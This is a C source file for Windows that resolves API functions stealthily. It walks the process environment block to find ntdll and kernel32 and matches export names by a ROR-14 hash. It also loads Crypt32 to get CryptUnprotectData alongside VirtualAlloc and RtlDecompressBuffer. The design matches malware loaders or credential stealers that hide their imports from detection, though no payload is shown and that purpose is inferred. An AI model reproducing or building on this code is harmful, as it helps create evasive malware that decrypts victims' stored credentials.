#include <windows.h>
#include "api.h"


static inline PEB* NtCurrentPeb() {
#ifdef _M_X64
    return (PEB*)(__readgsqword(0x60));
#elif _M_IX86
    return (PEB*)(__readfsdword(0x30));
#else
#error "This architecture is currently unsupported"
#endif
}

void FillApiStruct(PUCHAR pModuleBase, API* api) {
    PIMAGE_NT_HEADERS  pNTHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModuleBase + ((PIMAGE_DOS_HEADER)pModuleBase)->e_lfanew);
    DWORD dwExportDirRVA = pNTHeader->OptionalHeader.DataDirectory[0].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)pModuleBase + dwExportDirRVA);
    PDWORD pdwFunctionNameBase = (PDWORD)((PCHAR)pModuleBase + pExportDir->AddressOfNames);

    for (int i = 0; i < pExportDir->NumberOfNames; i++) {
        PUCHAR name = (PUCHAR)(pModuleBase + pdwFunctionNameBase[i]);
        if (!*name)
            continue;
           
        USHORT usOrdinalTableIndex = *(PUSHORT)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfNameOrdinals) + (2 * i));
        FARPROC pFunction = ((ULONG_PTR)pModuleBase + *(PDWORD)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfFunctions) + (4 * usOrdinalTableIndex)));

        unsigned int hash_value = 0;
        do {
            hash_value = *name + ROR(hash_value, 14);
            ++name;
        } while (*name);

        switch (hash_value) {
        case KERNEL32_VirtualAlloc:
            api->KERNEL32_VirtualAlloc = (LPVOID(__stdcall*)(LPVOID, SIZE_T, DWORD, DWORD))pFunction;
            break;
        case KERNEL32_LoadLibraryA:
            api->KERNEL32_LoadLibraryA = (HMODULE(__stdcall*)(LPCSTR))pFunction;
            break;
        case NTDLL_RtlDecompressBuffer:
            api->NTDLL_RtlDecompressBuffer = (NTSTATUS(__stdcall*)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, PULONG))pFunction;
            break;
        case NTDLL_memcpy_s:
            api->NTDLL_memcpy_s = (void* (__stdcall*)(void*, const void*, size_t))pFunction;
            break;
        case KERNEL32_GetProcAddress:
            api->KERNEL32_GetProcAddress = (FARPROC(__stdcall*)(HMODULE, LPCSTR))pFunction;
            break;
        case KERNEL32_ExitProcess:
            api->KERNEL32_ExitProcess = (void(__stdcall*)(UINT))pFunction;
            break;
        case CRYPT32_CryptUnprotectData:
            api->CRYPT32_CryptUnprotectData = (HANDLE(__stdcall*)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*))pFunction;
            break;
        }
    }
}

void ResolveApi(API* api) {
    PLIST_ENTRY head = NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink;
    PLIST_ENTRY ntdll_entry = head->Flink;
    PLIST_ENTRY kernel32_entry = ntdll_entry->Flink;

    HMODULE h_ntdll = (HMODULE)((PMY_LDR_DATA_TABLE_ENTRY)ntdll_entry)->DllBase;
    HMODULE h_kernel32 = (HMODULE)((PMY_LDR_DATA_TABLE_ENTRY)kernel32_entry)->DllBase;
    if (!h_ntdll || !h_kernel32)
        return;

    FillApiStruct((IMAGE_DOS_HEADER*)h_ntdll, api);
    FillApiStruct((IMAGE_DOS_HEADER*)h_kernel32, api);
    HMODULE h_crypt32 = api->KERNEL32_LoadLibraryA("Crypt32");
    FillApiStruct((IMAGE_DOS_HEADER*)h_crypt32, api);
}
